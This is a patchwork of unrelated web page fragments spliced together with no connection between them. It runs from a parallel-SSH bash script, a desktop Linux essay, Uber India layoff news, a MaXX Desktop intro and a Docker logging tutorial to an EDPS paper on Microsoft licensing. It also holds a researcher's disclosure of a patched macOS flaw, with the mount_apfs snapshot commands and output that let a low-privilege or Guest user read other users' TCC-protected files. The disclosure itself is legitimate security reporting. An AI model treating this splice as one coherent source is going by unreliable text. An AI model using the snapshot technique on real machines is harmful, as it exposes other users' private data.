    <span>printf</span> <span>"</span><span>\n</span><span>Running command %s %s </span><span>\n</span><span>"</span> <span>"</span><span>${</span><span>ACTION</span><span>}</span><span> </span><span>${</span><span>H</span><span>}</span><span>"</span>
    SSH_COMMAND <span>"</span><span>$H</span><span>"</span> <span>"source ~/app/scripts/env.sh; </span><span>${</span><span>ACTION</span><span>}</span><span>"</span> &amp; 

    <span># '$!' is the PID which maps to the correct temp file</span>
    results[<span>$!</span><span>]=</span><span>$temp</span>
<span>done</span>

<span># Restore stdout and stderr</span>
<span>exec</span> &amp;&gt; /dev/tty

<span># Wait for the jobs that were executed</span>
<span>for </span>pid <span>in</span> <span>"</span><span>${</span><span>!results[@]</span><span>}</span><span>"</span><span>;</span> <span>do
    </span><span>wait</span> <span>$pid</span>
    <span>cat</span> <span>"</span><span>${</span><span>results</span><span>[</span><span>$pid</span><span>]</span><span>}</span><span>"</span>
<span>done</span>
</code></pre></div></div>
<p>There’s a lot to dissect in this little snippet. Let’s get right to it.</p>
<ul>
<li><code>set -u</code>: Most bash guides will ask you to use <code>set -eEuo pipefail</code>, but you would not want to use that especially
when you parallelize using background proccesses in bash. This would mean partial execution and we want to avoid that
all costs. The only error that we care about is <em>undefined variables</em>, hence the <em>set -u</em></li>
<li><code>GET HOSTS</code>: A simple function to generate a list of hosts that you want to run the command on.</li>
<li><code>exec &amp;&gt; ${temp} and exec &amp;&gt; /dev/tty</code>: This redirects the output temporarily and later resets it to the terminal.</li>
<li><code>results[$!]=$temp</code>: To keep track of which pid points to which output file.</li>
<li><code>for pid in "${!results[@]}"</code>: Traverse over every pid in the map and wait on it.</li>
</ul>
<p>This simple scripts saves a lot of time especially when you’re managing a cluster of servers.</p>

<![CDATA[Another non-year of Linux on the desktop]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Let’s look at other software on the desktop, to understand why there isn’t (as a broad, popular platform) Linux on the desktop, then how there could be.</p>





<p>Over on De Programmatica Ipsum I discussed <a href="https://deprogrammaticaipsum.com/cross-platform-is-the-platform/">the difference between the platform business model, and the technology platform</a>. In the platform model, the business acts as a matchmaking agent, connecting customers to vendors. An agricultural market is a platform, where stud farmers can meet dairy farmers to sell cattle, for example.</p>





<p>Meanwhile, when a technology platform is created by a business, it enables a two-sided business model. The (technology) platform vendor sells their APIs to developers as a way of making applications. They sell their technology to consumers with the fringe benefit that these third-party applications are available to augment the experience. The part of the business that is truly a platform model is the App Store, but those came late as an effort to capture a share of the (existing) developer-consumer sales revenue, and don’t really make the vendors platform businesses.</p>





<p>In fact, I’m going to drop the word platform now, as it has these two different meanings. I’ll say “store” or “App Store” when I’m talking about a platform business in software, and “stack” or “software stack” when I’m talking about a platform technology model.</p>





<p>Stack vendors have previously been very protective of their stack, trying to fend off alternative technologies that allow consumers to take their business elsewhere. Microsoft famously “poisoned” Java, an early and capable cross-platform application API, by bundling their own runtime that made Java applications deliberately run poorly. Apple famously added a clause to their store rules that forbade any applications made using off-stack technology.</p>





<p>Both of these situations are now in the past: Microsoft have even embraced some cross-platform technology options, making heavy use of Electron in their own applications and even integrating the Chromium rendering engine into their own browser to increase compatibility with cross-platform technology and reduce the cost of supporting those websites and applications made with Javascript. Apple have abandoned that “only” clause in their rules, replacing it with a collection of “but also” rules: yes you can make your applications out of whatever you want, but they have to support sign-in and payment mechanisms unique to their stack. So a cross-stack app is <em>de jure</em> better integrated in Apple’s sandpit.</p>





<p>These actions show us how these stack vendors expect people to switch stacks: they find a compelling application, they use it, they discover that this application works better or is better integrated on another stack, and so they change to it. If you’re worried about that, then you block those applications so that your customers can’t discover them. If you’re not worried about that, then you allow the technologies, and rely on the fact that applications are commodities and nobody is going to find a “killer app” that makes them switch.</p>





<p>Allowing third-party software on your own platform (cross-stack or otherwise) comes with a risk, that people are only buying your technology as an incidental choice to run something else, and that if it disappears from your stack, those customers might go away to somewhere that it is available. Microsoft have pulled that threat out of their briefcase before, settling a legal suit with Apple after suggesting that they would remove Word and Excel from the Mac stack.</p>





<p>That model of switching explains why companies that are otherwise competitors seem willing to support one another by releasing their own applications on each others’ stacks. When Apple and Microsoft are in competition, we’ve already seen that Microsoft’s applications give them leverage over Apple: they also allow Apple customers to be fringe players in the Microsoft sandpit, which may lead them to switch (for example when they see how much easier it is for their Windows-using colleagues to use all of the Microsoft collaboration tools their employers use). But Apple’s applications also give them leverage over Microsoft: the famed “halo effect” of Mac sales being driven by the iPod fits this model: you buy an iPod because it’s cool, and you use iTunes for Windows. Then you see how much better iTunes for Mac works, and your next computer is a Mac. The application is a gateway to the stack.</p>





<p>What has all of this got to do with desktop Linux? Absolutely nothing, and that’s my point. There’s never been a “halo effect” for the Free Software world because there’s never been a nucleus around which that halo can form. The <a href="http://catb.org/~esr/writings/cathedral-bazaar/cathedral-bazaar/">bazaar model</a> does a lot to ensure that. Let’s take a specific example: for many people, Thunderbird is the best email client you can possibly get. It also exists on multiple stacks, so it has the potential to be a “gateway” to desktop Linux.</p>





<p>But it won’t be. The particular bazaar hawkers working on Thunderbird don’t have any particular commitment to the rest of the desktop Linux stack: they’re not necessarily against it, but they’re not necessarily for it either. If there’s an opportunity to make Thunderbird better on Windows, anybody can contribute to exploit that opportunity. At best, Thunderbird on desktop Linux will be as good as Thunderbird anywhere else. Similarly, the people in the Nautilus file manager area of the bazaar have no particular commitment to tighter integration with Thunderbird, because their users might be using GNUMail or Evolution.</p>





<p>At one extreme, the licences of software in the bazaar dissuade switching, too. Let’s say that CUPS, the common UNIX printing subsystem, is the best way to do printing on any platform. Does that mean that, say, Mac users with paper-centric workflows or lifestyles will be motivated to switch to desktop Linux, to get access to CUPS? No, it means Apple will take advantage of the CUPS licence to integrate it into their stack, giving them access to the technology.</p>





<p>The only thing the three big stack vendors seem to agree on when it comes to free software licensing is that the GPL version 3 family of licences is incompatible with their risk appetites, particularly their weaponised patent portfolios. So that points to a way to avoid the second of these problems blocking a desktop Linux “halo effect”. Were there a GPL3 killer app, the stack vendors probably wouldn’t pick it up and integrate it. Of course, with no software patent protection, they’d be able to reimplement it without problem.</p>





<p>But even with that dissuasion, we still find that the app likely wouldn’t be a better experience on a desktop Linux stack than on Mac, or on Windows. There would be no halo, and there would be no switchers. Well, not no switchers, but probably no more switchers.</p>





<p>Am I minimising the efforts of consistency and integration made by the big free software desktop projects, KDE and GNOME? I don’t think so. I’ve used both over the years, and I’ve used other desktop environments for UNIX-like systems (please may we all remember CDE so that we never repeat it). They are good, they are tightly integrated, and thanks to the collaboration on specifications in the Free Desktop Project they’re also largely interoperable. What they aren’t is breakout. Where Thunderbird is a nucleus without a halo, Evolution is a halo without a nucleus: it works well with the other GNOME tools, but it isn’t a lighthouse attracting users from, say, Windows, to ditch the rest of their stack for GNOME on Linux.</p>





<p>Desktop Linux is a really good desktop stack. So is, say, the Mac. You could get on well with either, but unless you’ve got a particular interest in free software, or a particular frustration with Apple, there’s no reason to switch. Many people do not have that interest or frustration.</p>

<a target="_blank" href="https://www.cbsnews.com/news/uber-earnings-q1-161-million-loss-ridership-falls-3-percent/" rel="nofollow">said</a> during the conference call for its earnings. 
</p><p>
Earlier, as a part of its massive global layoff of 6,700 employees, Uber India had laid off 600 employees in India. “The impact of Covid-19 and the unpredictable nature of the recovery has left Uber IndiaSA with no choice but to reduce the size of its workforce. Around 600 full time positions across driver and rider support, as well as other functions, are being impacted. These reductions are part of previously announced global job cuts this month,” Pradeep Parameswaran, President, Uber India and South Asia had said during the layoffs in May 2020. 
</p><p><span>Advertisement</span></p><hr><p>However, Uber’s wish to shift its engineering to India is not something new. During his visit to India in 2019, Khosrowshahi had said that India is going to be a big source of innovation for them. “One example is the Uber Lite app, was designed and built in India and moved to over 30 countries around the world,” he had said.
</p><p>
Manik Gupta who was then the Chief Product Officer of Uber had said that Uber is proud of the engineering and product talent based out of Bengaluru and Hyderabad. “We have a goal to double the headcount in these offices and have 1,000 people to build innovative products out of India,” he had said.

<h3 id="bkmrk-introduction">Introduction</h3>
<p id="bkmrk-the-maxx-interactive">The MaXX Interactive Desktop a.k.a.&nbsp; MaXX Desktop or MID is the continuation of the 5dwm.org project released many years back. &nbsp; By the way, the 5dwm.org website is not associated with us anymore and we do not endorse its content, although it's ours and was miss-appropriated from us a few years ago.&nbsp; Back to our regular program :)&nbsp; So don't be mistaken, there is only one other real implementation of the IRIX Interactive Desktop(IID) and&nbsp; it's MaXX Desktop!</p>
<p id="bkmrk-more-info-on-the-ori"><a title="Not just a theme..." href="https://maxxinteractive.com/books/misc/page/not-just-a-theme"><strong>&gt;&gt; More details on what MaXX Desktop is made of</strong></a></p>
<h3 id="bkmrk-our-mission"><br>Our Mission</h3>
<p id="bkmrk-our-goal-is-to-bring">Our mission is to bring back this great user experience which focused on performance, stability and productivity while sporting a smooth-clean-minimalism look and feel&nbsp; with low-resources consumption. A smart desktop that puts the user's application in the forefront.&nbsp; <em><strong>More for your creativity.</strong></em></p>
<p id="bkmrk-so-there-is-no-surpr">So there is no surprises here, MaXX Desktop is a highly tuned Workstation Environment which can leverage&nbsp; multi-core&nbsp; workload processing, robust asynchronous multi-threaded POSIX Messaging, hardware acceleration and GPU specific optimizations that&nbsp; makes the MaXX Desktop so fast, light-weight and dependable. Enough geekin' out for now, although, we are and proud to be.</p>
<p id="bkmrk-maxx-desktop-is-a-tr">MaXX Desktop is a true re-implementation of the SGI Desktop while respecting the classic/retro SGI look and feel (which is very important for us to get it right), but also to expand and build on top of those solid foundations with a more modern-current user experience.&nbsp; See it as the <em>classic</em> or<em>original&nbsp;</em> look and feel of the desktop and a new <em>modern</em> take.&nbsp; We want the modern look to be/feel like a natural evolution of the classic SGI look, as if SGI did it themselves throughout several years perfecting an already pretty awesome recipe. &nbsp; The modern look still supports SGI Color Schemes and introduce UTF-8 support, anti-aliased font rendering, more hardware acceleration and a new virtual-desktop manager.</p>
<p id="bkmrk-we-believe-in-a-high">We believe in a High Performance Desktop Environment that provides the right set of tools to maximize creativity and productivity without sacrificing&nbsp; your system resources to some eye candy non-sense.&nbsp;<em> <strong>Again, less is more... And it keeps you focused.<br></strong></em></p>
<h3 id="bkmrk-from-the-ground-up">From the Ground Up</h3>
<p id="bkmrk-maxx-desktop-is-desi">The MaXX&nbsp; Desktop is designed from the ground up for speed,&nbsp; fast/responsive, lightweight/simplicity over eye-candidness, but more importantly, to get the heck out of your way... The name <em>MaXX Interactive</em> doesn't mean maximum visual interaction, which are distractions or so what we call, UI noises. It's means maximum creativity with interactive assistance from the Desktop. In may ways, it's made for you and your brain so that it can relax, focus on let the creative juice flowing with far fever distractions. We see desktop notifications in a very different way, but this is for another discussion. In short, the MaXX Desktop let you focus on the creative&nbsp; tasks ahead without interference or visual distractions.<em><strong>&nbsp; Our design philosophy is simple, do more with less...</strong></em></p>
<h3 id="bkmrk-experience-matter">Experience Matters</h3>
<p id="bkmrk-finally%2C-our-team-me">Our team is sharing the same vision of making use of the right set of technologies, using industry proven best practices and guide lines to build the right software, the right way.&nbsp; We aim at providing a consistent and pleasant user experience built on top of modern and stable foundations but yet flexible.&nbsp; Every good and useful piece of tech deserves to be future-proof...&nbsp; This is where&nbsp; several decades of experience in building battle-proven mission critical systems and high performance Enterprise class applications comes in.&nbsp; If it's architect-ed properly,&nbsp; it can evolve without breaking apart!</p>
<h3 id="bkmrk-is-maxx-desktop-for-">Is MaXX Desktop for you?</h3>
<p id="bkmrk-maxx-desktop%27s-typic">MaXX Desktop's typical users are: 2D/3D Computer Graphics Artists, Motion Pictures and Special Effects Studios, Software/Game Developers, Visualization/Simulation, Virtual Reality power-users or Oil and Gas research to name a few.&nbsp; MaXX Desktop is also for anyone who wants get a break from all the surrounding noises and to create stuff while sporting a very unique/cool daily driver!&nbsp; <em><strong>Then, MaXX&nbsp; is for you too!&nbsp;</strong></em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p>Docker allows us to stream logs to different places with plugins called logging drivers.</p>
<p>How to change logging driver? What’s the most popular ones?</p>

<p>Docker has got two types of logging drivers:</p>
<ul>
<li>built-in like:
<ul>
<li><code>awslogs</code></li>
<li><code>fluentd</code></li>
<li><code>gcplogs</code></li>
<li><code>gelf</code></li>
<li><code>journald</code></li>
<li><code>json-file</code></li>
<li><code>local</code></li>
<li><code>logentries</code></li>
<li><code>splunk</code></li>
<li><code>syslog</code></li>
</ul>
</li>
<li>external drivers that we can install with <code>docker plugin install</code></li>
</ul>
<p>Logging driver is used to forward logs from containers to specific log aggregators, widely known rsyslog or fluentd for example.</p>
<p>Default logging driver after installation is <code>json-file</code>.</p>
<p>It is important to test non default logging drivers before using on production - problems with logging can cause crash/hang or startup problems with containers.</p>
<h2 id="check-default-logging-driver">Check default logging driver</h2>
<p>This is driver that docker daemon will use for itself and containers that won’t have set explicit another driver at start</p>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 ~<span>]</span>$ docker info --format <span>'{{.LoggingDriver}}'</span>

        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

<h3 id="circle-time">Circle Time</h3>

<p>Every month, Jane Street Capital post a puzzle on their website.  This was the puzzle for <a href="https://www.janestreet.com/puzzles/circle-time/">June 2020</a>.</p>

<blockquote>
  <p>Call a “ring” of circles a collection of six circles of equal radius, say r, whose centers lie on the six vertices of a regular hexagon with side length 2r. This makes each circle tangent to its two neighbors, and we can call the center of the regular hexagon the “center” of the ring of circles. If we are given a circle C, what is the maximum proportion of the area of that circle we can cover with rings of circles entirely contained within C that all are mutually disjoint and share the same center?</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>I think the most difficult step in this months puzzle was to translate the problem statement above into a visual representation, as shown below.  If you got this far, you probably were able to solve the puzzle.</p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_1a.png"></p>

<p>Due to the symmetry of a hexagon, the ratio of the radius of two adjacent ring of circles are always the same.  Basic trigonometry was required to determine this ratio.</p>

<p>We now have a single equation, single variable.</p>

<h3 id="method-1-to-solve-the-equation-goal-seek-in-excel">Method 1 to solve the equation: Goal Seek in Excel</h3>

<p>I used the “Goal Seek” function in Excel to resolve <em>k</em>.</p>

<p>In Excel: select the <strong>Data</strong> tab, in the <strong>Data Tools</strong> group, click <strong>What-If Analysis</strong>, and then click <strong>Goal Seek</strong>.</p>

<h2>EDPS Public Paper on</h2>

<p>2 July 2020</p>
<div>
<p>The European Data Protection Supervisor (EDPS) is the independent supervisory authority established by Article 52 of <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN">Regulation (EU) 2018/1725</a> responsible for:</p>
<ul>
<li><p>Monitoring and ensuring the application of the provisions of Regulation (EU) 2018/1725 and any other EU act relating to the protection of the fundamental rights and freedoms of natural persons with regard to the processing of personal data by a EU institution or body;</p></li>
<li><p>Advising EU institutions and bodies and data subjects on all matters concerning the processing of personal data.</p></li>
</ul>
<p>To this end, the EDPS fulfils its duties in accordance with Article 57 of Regulation (EU) 2018/1725 and exercises the powers granted in Article 58 of Regulation (EU) 2018/1725.</p>
<p>The power to investigate is one of the tools established to monitor and ensure compliance with Regulation (EU) 2018/1725.</p>
</div>
<div>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. These findings and recommendations from the investigation are likely to be of wider interest than just of the EU institutions: they may be of particular interest to all public authorities in EU/EEA Member States.</p>
<p>The EDPS assessed the compliance of the licensing agreement between Microsoft and the EU institutions against the requirements laid down in Regulation (EU) 2018/1725<span data-cites="regulation20181725"><a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></span> which sets out the rules for data protection in the EU institutions, bodies, offices and agencies as well as the duties and powers of the European Data Protection Supervisor (EDPS).</p>
<p>In the interest of a coherent approach to personal data protection throughout the Union, and the free movement of personal data within the Union, the legislators aligned Regulation (EU) 2018/1725 as far as possible with the data protection rules of Regulation (EU) 2016/679<span data-cites="gdpr"><a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></span> (‘General Data Protection Regulation’ - GDPR). Whenever the provisions of Regulation (EU 2018/1725 follow the same principles as the provisions of the GDPR, these two sets of provisions should, under the case law of the Court of Justice of the European Union be interpreted homogeneously, in particular because the scheme of this Regulation should be understood as equivalent to the scheme of the GDPR.</p>
<p>The EDPS made the following key findings in its investigation into the EU institutions’ use of Microsoft products and services.</p>
<p>First, the licensing agreement between Microsoft and the EU institutions allowed Microsoft to define and change the parameters of its processing activities carried out on behalf of EU institutions and contractual data protection obligations. The discretion that Microsoft had, amounted to a broad right for Microsoft to act as a controller. Given the EU institutions’ role as public service institutions, the EDPS did not consider this appropriate. The EDPS recommended to EU institutions that they act to retain controllership.</p>
<p>Second, EU institutions needed to put in place a comprehensive and compliant controller-processor agreement and documented instructions of the EU institutions to the processors. Their lack of control over which sub-processors Microsoft used and lack of meaningful audit rights also presented significant issues. The EDPS made recommendations on how to improve the controller-processor agreement and put robust audit checks in place.</p>
<p>Third, EU institutions faced a number of linked issues concerning data location, international transfers and the risk of unlawful disclosure of data. They were unable to control the location of a large portion of the data processed by Microsoft. Nor did they properly control what was transferred out of the EU/EEA and how. There was also a lack of proper safeguards to protect data that left the EU/EEA. EU institutions also had few guarantees at their disposal to defend their privileges and immunities and ensure that Microsoft would only disclose personal data insofar as permitted by EU law. The EDPS made recommendations to assist EU institutions in addressing these issues.</p>
<p>Fourth, the EDPS considered the technical measures that the Commission had put in place to stem the flow of personal data generated by Microsoft products and services and sent to Microsoft. The EDPS recommended that all EU institutions perform tests using a revised and comprehensive approach, share among them the knowledge and technical solutions they developed to prevent unauthorised data flows to Microsoft and inform each other of any data protection issues they identify with the products or services.</p>
<p>Fifth, the EU institutions had insufficient clarity as to the nature, scope and purposes of the processing and the risks to data subjects to be able to meet their transparency obligations towards data subjects. The EDPS recommended that EU institutions seek the clarity and assurances allowing them to keep data subjects properly informed.</p>

<h2 data-number="1.1" id="context"> Context</h2>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. It presents the EDPS’ findings and recommendations from the investigation to be shared with a wider audience, applying a high standard of transparency<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a>, while preserving the necessary confidentiality of certain elements of the EU institutions’ contract and of the EDPS’ investigation.</p>
<p>A large amount of personal data is processed through the EU institutions’ use of Microsoft products and services. Over 45&nbsp;000 staff of EU institutions, including the EDPS, are users of those products and services. In addition, staff use Microsoft products and services to process the personal data of people who are not staff.</p>
<p>The EDPS’ investigation focused on the terms of the <em>Inter-Institutional Licensing Agreement</em> (‘ILA’) that EU institutions signed with Microsoft in 2018. The EDPS also considered the technical measures that the European Commission, as the largest EU institution with a great variety of tasks, had implemented affecting the flow of personal data to Microsoft.</p>
<p>The EDPS issued its findings and recommendations to the EU institutions upon the closure of its investigation in March 2020. The purpose of the EDPS’ report was to provide EU institutions with forward-looking assistance in bringing their arrangements into compliance with data protection law. In particular, the EDPS’ findings and recommendations were oriented towards supporting the renegotiation of the ILA and EU institutions’ contract and implementation of robust technical and organisational measures that should accompany the contract.</p>
<p>EU institutions’ processing of personal data and the EDPS’ own supervisory and investigative powers are governed by Regulation (EU) 2018/1725.<span data-cites="regulation20181725"><a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></span> The EDPS assessed the compliance of the ILA against the requirements laid down in that regulation. Although Regulation (EU) 2018/1725 is a data protection regime that is tailored to the EU institutions and distinct from the better-known General Data Protection Regulation<span data-cites="gdpr"><a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></span> (‘GDPR’), the overlap between the provisions of Regulation (EU) 2018/1725 and those of the GDPR is extensive.</p>
<p>As a consequence, the EDPS’ findings and recommendations are likely to be of wider interest than to EU institutions.<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a> Not only is the law the EDPS applied in its investigation based on the same principles and shares the vast majority of provisions with the GDPR, but the agreement signed by EU institutions is based on standard Microsoft volume-licensing documents and therefore likely to bear similarities to agreements concluded by other organisations. The EDPS’ findings and recommendations may be of particular interest to public authorities in EU member states.</p>
<p>They are also likely to be of relevance beyond the conclusion and implementation of volume licensing agreements for Microsoft products and services. In the EDPS’ view, organisations outsourcing provision or operation of digital services from other service providers are likely to come across similar issues.</p>
<h2 data-number="1.2" id="general-recommendations"> General recommendations</h2>
<p>The EDPS recommended that EU institutions carefully consider any purchases of Microsoft products and services or new uses of existing products and services until after they have analysed and implemented the recommendations of the EDPS. They should involve their Data Protection Officers when deciding how to implement the recommendations of the EDPS. The EU institutions should properly embed data protection in each specific public information and communications technology procurement procedure, specifying the security and data protection measures to be implemented in respect of the particular products and services that are being procured.</p>
<p>This will help EU institutions, from the start, to procure products and services with appropriate contractual and other organisational measures, technical and security measures so that the processing of personal data through those tools complies with Regulation (EU) 2018/1725, in particular with the principle of data protection by design and by default.<span data-cites="regulation20181725"><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a></span></p>

    <section>


